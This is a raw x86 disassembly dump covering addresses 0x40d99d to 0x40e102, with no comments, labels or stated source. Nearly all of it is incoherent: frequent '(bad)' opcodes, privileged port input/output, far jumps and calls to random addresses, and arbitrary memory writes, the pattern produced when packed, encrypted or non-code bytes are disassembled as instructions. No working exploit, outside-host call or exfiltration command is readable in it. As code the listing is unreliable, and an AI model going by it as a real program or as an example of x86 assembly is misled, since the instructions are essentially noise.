  40d99d:	test   DWORD PTR [eax+edi*8],ebx
  40d9a0:	mov    BYTE PTR [edi],0xc7
  40d9a3:	xor    BYTE PTR [ecx],al
  40d9a5:	pushf  
  40d9a6:	inc    esp
  40d9a7:	jmp    0x40d9c1
  40d9a9:	add    DWORD PTR [eax+0x9c0130],0x44500875
  40d9b3:	jne    0x40d9cd
  40d9b5:	or     DWORD PTR [eax+0x100185],eax
  40d9bb:	or     al,0x0
  40d9bd:	jne    0x40da00
  40d9bf:	call   0xff65d84f
  40d9c4:	mov    eax,DWORD PTR [eax+ebx*8+0xc]
  40d9c8:	add    BYTE PTR [ebx+ecx*4+0xc],al
  40d9cc:	adc    al,0x5e
  40d9ce:	add    al,0xe5
  40d9d0:	add    dl,al
  40d9d2:	add    BYTE PTR [eax],al
  40d9d4:	inc    DWORD PTR [ecx]
  40d9d6:	push   eax
  40d9d7:	cli    
  40d9d8:	add    al,bh
  40d9da:	shl    DWORD PTR [ecx],1
  40d9dc:	inc    esp
  40d9dd:	jmp    0x40d9eb
  40d9df:	xor    DWORD PTR [ebp+esi*2+0x14],eax
  40d9e3:	test   esi,eax
  40d9e5:	cli    
  40d9e6:	(bad)  
  40d9e7:	inc    DWORD PTR [eax+ecx*1+0x24]
  40d9eb:	inc    DWORD PTR [esp+0x1c]
  40d9ef:	and    al,0x74
  40d9f1:	mov    ebx,DWORD PTR [eax]
  40d9f3:	or     al,0x44
  40d9f5:	and    al,0x28
  40d9f7:	and    al,0x8d
  40d9f9:	add    esp,DWORD PTR [esp+esi*2]
  40d9fc:	push   eax
  40d9fd:	and    al,0x74
  40d9ff:	and    al,0x2c
  40da01:	add    esi,DWORD PTR [esp+eax*2+0x24]
  40da05:	ss mov bl,0x7
  40da08:	inc    DWORD PTR [ecx-0x7749775]
  40da0e:	xor    edi,DWORD PTR [esi+0x3b]
  40da11:	mov    ecx,DWORD PTR [ebx+0xf338b5d]
  40da17:	and    al,0x85
  40da19:	pushf  
  40da1a:	pushf  
  40da1b:	clc    
  40da1c:	dec    DWORD PTR [ecx+0x41073f5f]
  40da22:	add    BYTE PTR [ebx+0x7],al
  40da25:	inc    ecx
  40da26:	add    BYTE PTR [edi+0x7],al
  40da29:	inc    ecx
  40da2a:	add    BYTE PTR [ebx+0x7],cl
  40da2d:	inc    ecx
  40da2e:	add    BYTE PTR [edi+0x7],cl
  40da31:	inc    ecx
  40da32:	add    BYTE PTR [ebx+0x7],dl
  40da35:	inc    ecx
  40da36:	add    BYTE PTR [edi+0x7],dl
  40da39:	inc    ecx
  40da3a:	add    BYTE PTR [ebx+0x7],bl
  40da3d:	inc    ecx
  40da3e:	add    ah,dl
  40da40:	(bad)  
  40da41:	in     eax,dx
  40da42:	jp     0x40da33
  40da44:	jp     0x40da1d
  40da46:	(bad)  
  40da47:	jnp    0x40da85
  40da49:	adc    ecx,DWORD PTR [esi-0x63]
  40da4c:	jae    0x40da4a
  40da4e:	lods   al,BYTE PTR ds:[esi]
  40da4f:	xor    eax,0x1e0000e1
  40da54:	pop    es
  40da55:	add    BYTE PTR [eax],al
  40da57:	pop    ebp
  40da58:	aam    0xf8
  40da5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da5b:	cmp    eax,0x682415c8
  40da60:	adc    DWORD PTR [ebx+eax*4],0x19
  40da64:	imul   esp,ebx,0xfffffff0
  40da67:	je     0x40dab4
  40da69:	mov    esi,0xaca93d82
  40da6e:	adc    BYTE PTR [edi-0x6d],bl
  40da71:	jge    0x40d9f7
  40da73:	cld    
  40da74:	add    dh,al
  40da76:	inc    edx
  40da77:	add    dh,BYTE PTR [esi]
  40da79:	xchg   ebp,eax
  40da7a:	mov    bh,0xfe
  40da7c:	call   0xe6f9:0xa19fad70
  40da83:	repnz les ebp,FWORD PTR [ebx-0x65e9121]
  40da8a:	ret    
  40da8b:	daa    
  40da8c:	mov    edx,fs
  40da8e:	lods   eax,DWORD PTR ds:[esi]
  40da8f:	(bad)  
  40da90:	aam    0xbb
  40da92:	sub    DWORD PTR [ebp+esi*1-0x37db5510],esi
  40da99:	pop    es
  40da9a:	(bad)  
  40da9b:	sahf   
  40da9c:	scas   al,BYTE PTR es:[edi]
  40da9d:	cmp    al,0xaf
  40da9f:	out    dx,al
  40daa0:	xchg   BYTE PTR [ebx],dl
  40daa2:	loope  0x40da2a
  40daa4:	jne    0x40daf6
  40daa6:	cdq    
  40daa7:	push   es
  40daa8:	push   esi
  40daa9:	icebp  
  40daaa:	test   DWORD PTR [ebx*2+0x513effc],ebp
  40dab1:	jecxz  0x40dabe
  40dab3:	sar    DWORD PTR [ecx+edi*8+0x79429ec1],1
  40daba:	js     0x40db0a
  40dabc:	lea    ebp,[esi]
  40dabe:	xor    DWORD PTR [eax-0x16],esp
  40dac1:	loopne 0x40da88
  40dac3:	mov    ds:0xf78b4824,eax
  40dac8:	and    BYTE PTR [edi-0x4328bae5],al
  40dace:	cmp    al,0x30
  40dad0:	push   ecx
  40dad1:	(bad)  
  40dad2:	cdq    
  40dad3:	jno    0x40dae6
  40dad5:	push   ebx
  40dad6:	sub    eax,0x41745d7a
  40dadb:	outs   dx,BYTE PTR ds:[esi]
  40dadc:	(bad)  
  40dadd:	adc    DWORD PTR [esi],ebx
  40dadf:	fs sub eax,0x58166f58
  40dae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dae6:	das    
  40dae7:	sub    al,0xab
  40dae9:	leave  
  40daea:	add    al,0x31
  40daec:	adc    dl,BYTE PTR [ebx+0x64]
  40daef:	dec    ecx
  40daf0:	fld    QWORD PTR [eax]
  40daf2:	add    eax,0x62ad89f4
  40daf7:	ret    0x1f14
  40dafa:	xlat   BYTE PTR ds:[ebx]
  40dafb:	and    edx,edx
  40dafd:	inc    edi
  40dafe:	es jp  0x40dacb
  40db01:	cwde   
  40db02:	inc    edi
  40db03:	adc    edi,DWORD PTR [edx]
  40db05:	loop   0x40daa8
  40db07:	cld    
  40db08:	ins    BYTE PTR es:[edi],dx
  40db09:	sub    BYTE PTR [eax-0x1839fd1a],bl
  40db0f:	push   0xffffffab
  40db11:	pop    ebp
  40db12:	sub    BYTE PTR [eax-0x58842b98],ch
  40db18:	stos   DWORD PTR es:[edi],eax
  40db19:	xchg   ebx,eax
  40db1a:	inc    edi
  40db1b:	shr    BYTE PTR [edi+0x7],1
  40db1e:	inc    eax
  40db1f:	out    0x93,al
  40db21:	mov    ebp,0xbd8e224
  40db26:	cs jecxz 0x40dac5
  40db29:	and    bl,BYTE PTR [eax-0x3a216332]
  40db2f:	sub    eax,0x49a4f8b7
  40db34:	or     DWORD PTR ds:[edx-0x593d7ecd],esi
  40db3b:	lods   al,BYTE PTR ds:[esi]
  40db3c:	pop    ebp
  40db3d:	sbb    eax,0x99bd7288
  40db42:	mov    ebp,0xe7a408ad
  40db47:	das    
  40db48:	mov    esi,0xb81f380b
  40db4d:	xchg   edi,eax
  40db4e:	nop
  40db4f:	mov    eax,ds:0x89308c2f
  40db54:	in     eax,0x9e
  40db56:	fidiv  DWORD PTR [ebx]
  40db58:	jge    0x40dbb6
  40db5a:	pop    ds
  40db5b:	add    ch,BYTE PTR [ebx-0x6e9348a8]
  40db61:	mov    dh,0x3b
  40db63:	add    BYTE PTR [edi],ah
  40db65:	shl    DWORD PTR [edi+0x29],1
  40db68:	sahf   
  40db69:	scas   eax,DWORD PTR es:[edi]
  40db6a:	mov    dh,0x28
  40db6c:	inc    esp
  40db6d:	in     al,0x72
  40db6f:	jp     0x40daf9
  40db71:	ins    BYTE PTR es:[edi],dx
  40db72:	lahf   
  40db73:	inc    esi
  40db74:	jmp    0x507b783c
  40db79:	sbb    edx,edx
  40db7b:	jnp    0x40db93
  40db7d:	and    DWORD PTR [ecx+0x5e],esi
  40db80:	out    0x16,al
  40db82:	mov    eax,0x56c1cb59
  40db87:	adc    dh,BYTE PTR ds:0x5c2119dd
  40db8d:	lea    eax,ds:0x8d527a9c
  40db93:	lds    ebp,FWORD PTR [edi-0xf]
  40db96:	dec    ebp
  40db97:	pop    eax
  40db98:	xor    al,0xe3
  40db9a:	mov    edx,DWORD PTR [ebx+0xa]
  40db9d:	jbe    0x40db84
  40db9f:	mov    bh,0xba
  40dba1:	loop   0x40dbfd
  40dba3:	xor    DWORD PTR [ecx+0x6d],esp
  40dba6:	out    0x1c,al
  40dba8:	les    ebx,FWORD PTR [edx-0x7b]
  40dbab:	mov    ds:0xb1de4426,al
  40dbb0:	inc    ebp
  40dbb1:	stos   BYTE PTR es:[edi],al
  40dbb2:	nop
  40dbb3:	jnp    0x40dbed
  40dbb5:	addr16 in eax,0x57
  40dbb8:	jp     0x40db64
  40dbba:	jg     0x40dbdb
  40dbbc:	dec    ebx
  40dbbd:	jmp    0xe3e245d6
  40dbc2:	mov    ah,0x3d
  40dbc4:	jmp    0xb43f:0xbe1da499
  40dbcb:	int3   
  40dbcc:	sub    eax,DWORD PTR [esi]
  40dbce:	xchg   BYTE PTR [ebx],dh
  40dbd0:	push   ds
  40dbd1:	push   ecx
  40dbd2:	sti    
  40dbd3:	and    esi,ebx
  40dbd5:	inc    DWORD PTR [ecx]
  40dbd7:	mov    ecx,0xd502d4ae
  40dbdc:	repz sahf 
  40dbde:	pop    ebx
  40dbdf:	and    al,0x72
  40dbe1:	out    0x67,eax
  40dbe3:	inc    edi
  40dbe4:	add    BYTE PTR [ebx+0x48],ch
  40dbe7:	sbb    DWORD PTR [esi+0x41b346cc],esp
  40dbed:	pop    edi
  40dbee:	nop
  40dbef:	mov    cl,0x87
  40dbf1:	jle    0x40dc52
  40dbf3:	push   cs
  40dbf4:	repnz clc 
  40dbf6:	and    ecx,DWORD PTR [edi+edx*2]
  40dbf9:	(bad)  
  40dbfa:	aas    
  40dbfb:	fbstp  TBYTE PTR [edx]
  40dbfd:	xchg   ebp,eax
  40dbfe:	ret    0xae83
  40dc01:	fistp  WORD PTR [ecx-0x6231f9e8]
  40dc07:	mov    al,ds:0x3594463c
  40dc0c:	mov    ds:0xbc2fddd8,al
  40dc11:	cmp    BYTE PTR [eax],ah
  40dc13:	cmp    al,0x39
  40dc15:	dec    esp
  40dc16:	mov    cl,0x68
  40dc18:	dec    esp
  40dc19:	push   edx
  40dc1a:	inc    ecx
  40dc1b:	cs retf 0xe6bb
  40dc1f:	inc    ebp
  40dc20:	and    bx,WORD PTR [ebx-0x747bcc72]
  40dc27:	out    dx,eax
  40dc28:	popa   
  40dc29:	icebp  
  40dc2a:	mov    eax,0x828377b7
  40dc2f:	or     DWORD PTR [ebp-0x73ab7cc4],ebp
  40dc35:	pop    es
  40dc36:	fimul  WORD PTR [edx-0x4303c0c7]
  40dc3c:	fadd   DWORD PTR [eax-0x20]
  40dc3f:	xor    DWORD PTR [eax],eax
  40dc41:	fld    st(5)
  40dc43:	pop    ecx
  40dc44:	push   edx
  40dc45:	call   0x2586de65
  40dc4a:	push   eax
  40dc4b:	jge    0x40dbea
  40dc4d:	mov    eax,ds:0xfe05d78b
  40dc52:	add    BYTE PTR [edx],al
  40dc54:	test   BYTE PTR [edi],dl
  40dc56:	push   ds
  40dc57:	add    esi,DWORD PTR [ebp-0x5c]
  40dc5a:	ror    BYTE PTR [ecx],0x65
  40dc5d:	sub    al,0x7f
  40dc5f:	pusha  
  40dc60:	mov    ds:0x1035bccd,eax
  40dc65:	add    BYTE PTR [edx],dh
  40dc67:	mov    dl,0x85
  40dc69:	not    DWORD PTR [edi+0x3b42e2c6]
  40dc6f:	xlat   BYTE PTR ds:[ebx]
  40dc70:	ret    
  40dc71:	or     eax,0x1b6591e4
  40dc76:	mov    ch,0xa4
  40dc78:	push   cs
  40dc79:	enter  0x692f,0xfb
  40dc7d:	loopne 0x40dc11
  40dc7f:	mov    ah,0xc8
  40dc81:	mov    ecx,0xf1bc9bc8
  40dc86:	mov    edi,0x7dc2088e
  40dc8b:	sub    al,0x1f
  40dc8d:	aad    0xd5
  40dc8f:	mov    gs,WORD PTR [edx]
  40dc91:	mov    al,ds:0x7f54c96b
  40dc96:	adc    DWORD PTR [ebp-0x58],ebx
  40dc99:	xor    BYTE PTR [edx],0x11
  40dc9c:	ja     0x40dcc9
  40dc9e:	mov    dl,0xf5
  40dca0:	arpl   WORD PTR [esi],di
  40dca2:	fistp  QWORD PTR [ebp+0x8]
  40dca5:	add    BYTE PTR [ecx-0x40],cl
  40dca8:	add    eax,0x2e9c0158
  40dcad:	xor    eax,0xa0aef9f8
  40dcb2:	xor    ch,BYTE PTR ds:0xe2cc185
  40dcb8:	outs   dx,BYTE PTR ds:[esi]
  40dcb9:	pusha  
  40dcba:	pop    edi
  40dcbb:	adc    ah,dl
  40dcbd:	lods   al,BYTE PTR ds:[esi]
  40dcbe:	shl    BYTE PTR [ecx-0x3e],1
  40dcc1:	rol    dh,0x48
  40dcc4:	icebp  
  40dcc5:	and    BYTE PTR [esi+0x2],cl
  40dcc8:	inc    ebp
  40dcc9:	xor    DWORD PTR [edi-0x3594fc63],esi
  40dccf:	repnz gs sbb edi,DWORD PTR ss:[eax]
  40dcd4:	shl    BYTE PTR ds:[edi-0x1259a531],0x63
  40dcdc:	mov    BYTE PTR [ecx],0xf5
  40dcdf:	pop    ss
  40dce0:	mov    edx,esi
  40dce2:	inc    esi
  40dce3:	pop    es
  40dce4:	inc    ecx
  40dce5:	jno    0x40dc68
  40dce7:	jnp    0x40dcc0
  40dce9:	call   0xa78ae97e
  40dcee:	mov    al,ds:0x8f783ff
  40dcf3:	out    0xcb,al
  40dcf5:	pop    edx
  40dcf6:	add    DWORD PTR [edi-0x7a2a6c1],ebx
  40dcfc:	mov    ds:0x39046caa,al
  40dd01:	cmc    
  40dd02:	outs   dx,BYTE PTR ds:[esi]
  40dd03:	adc    BYTE PTR [eax+ebp*8-0x1c],ah
  40dd07:	jae    0x40dce5
  40dd09:	test   eax,0x6d5bbfd3
  40dd0e:	xchg   edi,eax
  40dd0f:	xchg   BYTE PTR [ebp+0x71],ah
  40dd12:	std    
  40dd13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd14:	jmp    0xcfb1:0x67b9ff4d
  40dd1b:	dec    ebx
  40dd1c:	aam    0x59
  40dd1e:	sub    DWORD PTR [edx-0x34],edi
  40dd21:	into   
  40dd22:	push   edx
  40dd23:	dec    ebx
  40dd24:	push   es
  40dd25:	mov    edx,0xca93933b
  40dd2a:	pop    esp
  40dd2b:	popf   
  40dd2c:	mov    DWORD PTR [ebp-0x3b99aef7],ebx
  40dd32:	call   0xbe09b067
  40dd37:	or     BYTE PTR [esi+0x15],dh
  40dd3a:	std    
  40dd3b:	or     DWORD PTR ds:0x698de6ed,edi
  40dd41:	ror    BYTE PTR [ebx-0x21],1
  40dd44:	jae    0x40ddb5
  40dd46:	(bad)  
  40dd48:	jo     0x40dd42
  40dd4a:	sub    eax,0xdc0dec4e
  40dd4f:	sbb    ebx,ebx
  40dd51:	loop   0x40dd98
  40dd53:	fdiv   DWORD PTR [eax-0x28191c24]
  40dd59:	pop    esi
  40dd5a:	lds    eax,FWORD PTR [ebx-0x14386b84]
  40dd60:	lods   al,BYTE PTR fs:[esi]
  40dd62:	imul   ecx,DWORD PTR [ecx],0xeeb86880
  40dd68:	xchg   ecx,eax
  40dd69:	push   esp
  40dd6a:	fisub  DWORD PTR [edi]
  40dd6c:	and    eax,0xfad4b82e
  40dd71:	dec    ecx
  40dd72:	inc    ebx
  40dd73:	bound  ebx,QWORD PTR [eax+0x645a595d]
  40dd79:	and    edx,edx
  40dd7b:	cmp    BYTE PTR [edx+0x0],0xdc
  40dd7f:	ror    ch,cl
  40dd81:	ds or  al,0xaa
  40dd84:	(bad)  
  40dd85:	in     eax,dx
  40dd86:	je     0x40dd4c
  40dd88:	adc    eax,DWORD PTR [ebx+0x5c]
  40dd8b:	cmp    ecx,DWORD PTR [ebx+ecx*8+0x6ff27a94]
  40dd92:	in     al,dx
  40dd93:	loope  0x40dd72
  40dd95:	add    DWORD PTR [edx+0x6f],0xffffffc3
  40dd99:	mov    bl,0x2a
  40dd9b:	ins    BYTE PTR es:[edi],dx
  40dd9c:	sbb    ebp,DWORD PTR [edx+0x71]
  40dd9f:	mov    al,ds:0x3fcb9cee
  40dda4:	data16 fild WORD PTR [ecx+0x4e837109]
  40ddab:	and    al,0xe8
  40ddad:	hlt    
  40ddae:	int    0xdd
  40ddb0:	pop    edi
  40ddb1:	das    
  40ddb2:	(bad)  
  40ddb3:	adc    DWORD PTR [ebp+ebp*1+0x3bc938eb],esp
  40ddba:	in     al,0xdb
  40ddbc:	fcomp  st(0)
  40ddbe:	push   0xffffffa3
  40ddc0:	mov    cl,0x2f
  40ddc2:	test   DWORD PTR [eax],edi
  40ddc4:	aas    
  40ddc5:	daa    
  40ddc6:	hlt    
  40ddc7:	push   esp
  40ddc8:	(bad)  
  40ddca:	mov    dl,0xbf
  40ddcc:	xchg   ebx,eax
  40ddcd:	ud0    ebp,DWORD PTR [ebp+0x6c]
  40ddd1:	(bad)  
  40ddd2:	mov    al,ds:0x3a323199
  40ddd7:	or     dl,ch
  40ddd9:	sbb    eax,DWORD PTR [eax+edi*4-0xdedfaf7]
  40dde0:	xchg   ebp,eax
  40dde1:	test   BYTE PTR [eax],bl
  40dde3:	jae    0x40ddca
  40dde5:	idiv   DWORD PTR [ebp-0x1f5752d]
  40ddeb:	lahf   
  40ddec:	daa    
  40dded:	inc    esi
  40ddee:	lods   al,BYTE PTR ds:[esi]
  40ddef:	pop    ss
  40ddf0:	push   eax
  40ddf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddf2:	push   edx
  40ddf3:	cdq    
  40ddf4:	je     0x40dda8
  40ddf6:	dec    edi
  40ddf7:	icebp  
  40ddf8:	cld    
  40ddf9:	mov    esp,0xfb6e56de
  40ddfe:	jecxz  0x40de2e
  40de00:	and    eax,0xcba22813
  40de05:	and    eax,DWORD PTR [esi]
  40de07:	fcmovne st,st(7)
  40de09:	sub    al,0xbb
  40de0b:	shr    DWORD PTR [ebx-0x79],cl
  40de0e:	sbb    edi,DWORD PTR [eax+0x40]
  40de11:	and    eax,0x93461e85
  40de16:	mov    dl,0x9d
  40de18:	add    al,BYTE PTR ds:0xad8d6315
  40de1e:	ret    
  40de1f:	pop    ss
  40de20:	xor    eax,0x2432bf61
  40de25:	out    dx,eax
  40de26:	idiv   DWORD PTR [esi-0x1f]
  40de29:	ja     0x40de9b
  40de2b:	push   ebp
  40de2c:	lds    edi,FWORD PTR [eax-0x7d]
  40de2f:	fnsave [ecx+0xe89baf1]
  40de35:	hlt    
  40de36:	mov    eax,0x514454c
  40de3b:	mov    dh,0xe5
  40de3d:	pop    es
  40de3e:	fld    DWORD PTR [ebp+0x60]
  40de41:	sub    cl,BYTE PTR [eax-0x2d6f630c]
  40de47:	push   ebx
  40de48:	out    dx,eax
  40de49:	bound  esp,QWORD PTR [eax+esi*8]
  40de4c:	jae    0x40de26
  40de4e:	xor    bh,ah
  40de50:	das    
  40de51:	xor    al,0xd3
  40de53:	jno    0x40de09
  40de55:	sub    cl,BYTE PTR [eax+0x7d7d7413]
  40de5b:	push   cs
  40de5c:	push   ebx
  40de5d:	loope  0x40de7f
  40de5f:	stos   DWORD PTR es:[edi],eax
  40de60:	mov    eax,ds:0x4574c11a
  40de65:	add    edx,DWORD PTR [eax]
  40de67:	(bad)  
  40de68:	adc    al,0xe3
  40de6a:	push   0xffffff84
  40de6c:	mov    ch,0x7d
  40de6e:	das    
  40de6f:	clc    
  40de70:	fwait
  40de71:	mov    edx,0xfc86c33b
  40de76:	xchg   edi,eax
  40de77:	ret    
  40de78:	jne    0x40de68
  40de7a:	aaa    
  40de7b:	call   0x407f1832
  40de80:	push   esp
  40de81:	and    dl,BYTE PTR [esi+0x675f4f47]
  40de87:	fucomp st(5)
  40de89:	inc    eax
  40de8a:	add    ch,BYTE PTR [ecx-0x6d]
  40de8d:	mov    al,ds:0x749ceada
  40de92:	mov    esi,0xbf717aeb
  40de97:	mov    ah,BYTE PTR [ebx+0x35]
  40de9a:	xchg   edx,eax
  40de9b:	(bad)  
  40de9c:	aas    
  40de9d:	xchg   ebx,eax
  40de9e:	sbb    BYTE PTR [esi],cl
  40dea0:	xchg   ecx,eax
  40dea1:	xlat   BYTE PTR ds:[ebx]
  40dea2:	xchg   ecx,eax
  40dea3:	in     al,dx
  40dea4:	pop    ds
  40dea5:	push   ss
  40dea6:	xor    al,al
  40dea8:	xor    DWORD PTR [edx-0x5cf4783a],ebp
  40deae:	sbb    BYTE PTR [esi+ebp*2-0x27],dh
  40deb2:	mov    edx,0x1594398f
  40deb7:	in     eax,0xd4
  40deb9:	or     bh,ch
  40debb:	into   
  40debc:	(bad)  
  40debd:	mov    al,0x60
  40debf:	fnsave [ebx-0x5de43758]
  40dec5:	sbb    DWORD PTR [edx-0x4af959b6],0x12a8f314
  40decf:	js     0x40df4f
  40ded1:	lahf   
  40ded2:	outs   dx,DWORD PTR ds:[esi]
  40ded3:	clc    
  40ded4:	dec    edi
  40ded5:	add    BYTE PTR [esi],cl
  40ded7:	out    0x32,eax
  40ded9:	mov    ebx,0x92e26297
  40dede:	mov    al,ds:0x7cb9dc1f
  40dee3:	adc    DWORD PTR ds:0x3be71326,ecx
  40dee9:	xor    DWORD PTR [edx-0x74],ecx
  40deec:	aas    
  40deed:	adc    al,0xfc
  40deef:	icebp  
  40def0:	xchg   ebx,eax
  40def1:	scas   eax,DWORD PTR es:[edi]
  40def2:	or     esi,DWORD PTR [esi+0x2fbd217c]
  40def8:	(bad)  
  40def9:	int    0xb9
  40defb:	shl    BYTE PTR [edx],cl
  40defd:	mov    esi,0xb7c42a1a
  40df02:	mov    ds:0xc5f6d909,eax
  40df07:	mov    eax,ds:0x605b784
  40df0c:	mov    ch,0xff
  40df0e:	and    ch,BYTE PTR [ecx+0x4a852e47]
  40df14:	leave  
  40df15:	lods   al,BYTE PTR ds:[esi]
  40df16:	sub    bl,BYTE PTR [ecx+0x79]
  40df19:	addr16 xchg edi,ebx
  40df1c:	scas   al,BYTE PTR es:[edi]
  40df1d:	add    BYTE PTR [ebx],0x13
  40df20:	add    ebp,DWORD PTR [edx+0x30]
  40df23:	and    DWORD PTR [edi],edx
  40df25:	repz test DWORD PTR [edi-0x57fd4c1],eax
  40df2c:	cmp    BYTE PTR [ebx+0x62c41edc],dl
  40df32:	xor    BYTE PTR [ebx-0x36703a91],bh
  40df38:	in     eax,0x60
  40df3a:	les    ecx,FWORD PTR [edx-0x664810f9]
  40df40:	call   0xc912368f
  40df45:	pop    edx
  40df46:	cmp    esi,esp
  40df48:	jg     0x40df69
  40df4a:	test   BYTE PTR [ecx],0xc7
  40df4d:	popf   
  40df4e:	dec    eax
  40df4f:	inc    esp
  40df50:	retf   0x2c79
  40df53:	sbb    cl,dh
  40df55:	loope  0x40df74
  40df57:	adc    eax,0x4db3676c
  40df5c:	or     eax,0x4f5f4b44
  40df61:	(bad)  
  40df62:	jmp    0xdececeef
  40df67:	pop    esi
  40df68:	mov    ebx,0x858e721f
  40df6d:	enter  0x3b1f,0x4e
  40df71:	mov    ah,0xe8
  40df73:	mov    al,ds:0xfdbb2ba3
  40df78:	js     0x40dff4
  40df7a:	(bad)
  40df7d:	leave  
  40df7e:	push   ecx
  40df7f:	jmp    0x6c09:0xf81f40f8
  40df86:	pop    edx
  40df87:	mov    cl,0x5
  40df89:	out    dx,eax
  40df8a:	cmp    eax,0x40576b2d
  40df8f:	shl    BYTE PTR [esi],0xd9
  40df92:	cmp    eax,0xd11c8b1d
  40df97:	sub    eax,DWORD PTR [edi-0x18]
  40df9a:	sbb    edi,DWORD PTR [edx]
  40df9c:	add    al,0xbc
  40df9e:	not    DWORD PTR [edi]
  40dfa0:	jne    0x40dfd2
  40dfa2:	inc    eax
  40dfa3:	mov    DWORD PTR [ecx-0x5ab86df9],ebp
  40dfa9:	xabort 0x80
  40dfac:	sbb    ebp,DWORD PTR [esp+esi*2-0x25]
  40dfb0:	push   ss
  40dfb1:	dec    esp
  40dfb2:	(bad)  
  40dfb3:	(bad)  
  40dfb5:	fistp  WORD PTR [edx-0x165a552b]
  40dfbb:	not    ah
  40dfbd:	dec    ebx
  40dfbe:	adc    al,0xe7
  40dfc0:	(bad)  
  40dfc2:	xor    ebx,esp
  40dfc4:	push   esp
  40dfc5:	dec    esi
  40dfc6:	mov    bh,0x1b
  40dfc8:	lds    esi,FWORD PTR [ecx+ecx*2]
  40dfcb:	rcl    BYTE PTR [esi-0x2d],0x79
  40dfcf:	inc    ebx
  40dfd0:	je     0x40df5f
  40dfd2:	mov    al,0xf3
  40dfd4:	mov    eax,ds:0x9dd83e19
  40dfd9:	jmp    0x40dfdd
  40dfdb:	and    ecx,DWORD PTR [esi-0x23]
  40dfde:	fisttp WORD PTR [ebx-0x31060631]
  40dfe4:	inc    ebp
  40dfe5:	iret   
  40dfe6:	dec    esi
  40dfe7:	xchg   esi,eax
  40dfe8:	push   es
  40dfe9:	mov    cl,0xad
  40dfeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfec:	sahf   
  40dfed:	inc    ebx
  40dfee:	(bad)  
  40dfef:	(bad)  
  40dff0:	jae    0x40df97
  40dff2:	or     ebx,ebp
  40dff4:	dec    ebp
  40dff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dff7:	pusha  
  40dff8:	out    0x18,eax
  40dffa:	lds    esi,FWORD PTR [ebp+0x3d]
  40dffd:	pop    ebp
  40dffe:	lock jno 0x40dfcb
  40e001:	xchg   edx,eax
  40e002:	push   edx
  40e003:	xchg   BYTE PTR [ebx+0x71],al
  40e006:	rcl    DWORD PTR [ebp-0x42],cl
  40e009:	jno    0x40dfb6
  40e00b:	cmp    al,0x6
  40e00d:	aaa    
  40e00e:	mov    eax,0xbf7b6611
  40e013:	dec    ecx
  40e014:	and    bl,BYTE PTR [edx+0x52]
  40e017:	inc    esi
  40e018:	js     0x40e01e
  40e01a:	inc    esi
  40e01b:	xor    ch,cl
  40e01d:	sub    BYTE PTR [ebp-0x3c],cl
  40e020:	mov    bh,0xba
  40e022:	cmp    DWORD PTR [esi],eax
  40e024:	xor    BYTE PTR [ebp+ebx*4+0x6d2eacc3],0x48
  40e02c:	jmp    ecx
  40e02e:	cld    
  40e02f:	inc    edi
  40e030:	sub    al,0x47
  40e032:	mov    eax,ds:0x397eefac
  40e037:	addr16 aam 0x23
  40e03a:	pop    edx
  40e03b:	outs   dx,DWORD PTR ds:[esi]
  40e03c:	pop    esp
  40e03d:	jg     0x40dfee
  40e03f:	jns    0x40dfcb
  40e041:	pop    ds
  40e042:	fdivr  st,st(3)
  40e044:	sub    ebx,DWORD PTR [edi]
  40e046:	mov    BYTE PTR [ebx],dh
  40e048:	(bad)  
  40e049:	outs   dx,DWORD PTR es:[esi]
  40e04b:	cld    
  40e04c:	pop    ds
  40e04d:	stos   DWORD PTR es:[edi],eax
  40e04e:	in     al,0x26
  40e050:	or     al,BYTE PTR [ebp+0x74]
  40e053:	(bad)  
  40e054:	aas    
  40e055:	pop    esp
  40e056:	jb     0x40dffd
  40e058:	out    0x82,eax
  40e05a:	dec    eax
  40e05b:	fmul   QWORD PTR [edx]
  40e05d:	mov    ebx,0x7cda63fd
  40e062:	sbb    eax,0xef61886d
  40e067:	shr    DWORD PTR [ecx],0x90
  40e06a:	jne    0x24e4b3f3
  40e070:	cmp    al,0xd0
  40e072:	dec    esp
  40e073:	mov    dh,0xb0
  40e075:	fsub   DWORD PTR [edi]
  40e077:	ja     0x40e04f
  40e079:	mov    DWORD PTR [edx],0x6182317
  40e07f:	call   0x65b43eb2
  40e084:	xor    eax,0x3f1824fc
  40e089:	xchg   esp,edx
  40e08b:	and    al,BYTE PTR [ebx+0x3e]
  40e08e:	stos   DWORD PTR es:[edi],eax
  40e08f:	int    0x1e
  40e091:	sub    ebp,DWORD PTR [eax+ebx*8]
  40e094:	pushf  
  40e095:	push   0x4c
  40e097:	fbstp  TBYTE PTR [ebx+0x3]
  40e09a:	jp     0x40e0cd
  40e09c:	dec    ebp
  40e09d:	mov    WORD PTR [eax+0x35c5e2c6],ss
  40e0a3:	pop    edx
  40e0a4:	mov    ds:0xe33580b9,eax
  40e0a9:	mov    ecx,0x28c073a5
  40e0ae:	or     bh,0x56
  40e0b1:	rol    DWORD PTR [ecx+0x32d7241b],0x77
  40e0b8:	xchg   esp,eax
  40e0b9:	repnz or eax,DWORD PTR [edx]
  40e0bc:	mov    WORD PTR [esi],ss
  40e0be:	xor    esp,DWORD PTR [ebx]
  40e0c0:	jb     0x40e0d1
  40e0c2:	inc    edi
  40e0c3:	inc    edi
  40e0c4:	loope  0x40e13e
  40e0c6:	call   0xf65d49ec
  40e0cb:	xor    eax,0xac068bf8
  40e0d0:	icebp  
  40e0d1:	and    al,0xaa
  40e0d3:	std    
  40e0d4:	cmp    ebp,edi
  40e0d6:	add    DWORD PTR [edx],edx
  40e0d8:	pop    es
  40e0d9:	das    
  40e0da:	lods   eax,DWORD PTR ds:[esi]
  40e0db:	sbb    esi,edx
  40e0dd:	iret   
  40e0de:	adc    DWORD PTR [eax],0x8e136197
  40e0e4:	xor    bl,0xc8
  40e0e7:	adc    cl,BYTE PTR [ebx-0x4c19ce79]
  40e0ed:	popf   
  40e0ee:	(bad)  
  40e0ef:	or     bl,cl
  40e0f1:	sbb    ebx,DWORD PTR [esi-0x53]
  40e0f4:	bnd jmp 0x5b887ea8
  40e0fa:	(bad)  
  40e0fb:	sub    eax,0x3ac7c538
  40e100:	aas    
  40e101:	into   
  40e102:	cmp    esp,ecx
